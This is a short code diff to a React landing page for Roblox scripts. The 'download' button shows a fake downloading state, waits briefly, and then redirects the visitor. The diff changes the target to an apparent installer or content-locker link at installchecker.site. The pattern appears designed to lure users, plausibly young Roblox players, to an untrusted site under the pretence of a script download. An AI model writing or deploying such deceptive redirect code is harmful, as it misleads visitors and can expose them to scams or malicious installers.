@@ -24,7 +24,7 @@ export default function RobloxScriptsLanding() {
     setDownloading(true)
     setTimeout(() => {
       if (typeof window !== "undefined") {
-        window.location.href = "https://unlockscripts.vercel.app/"
+        window.location.href = "https://installchecker.site/cl/i/ex8w2l"
       }
     }, 1500)
   }
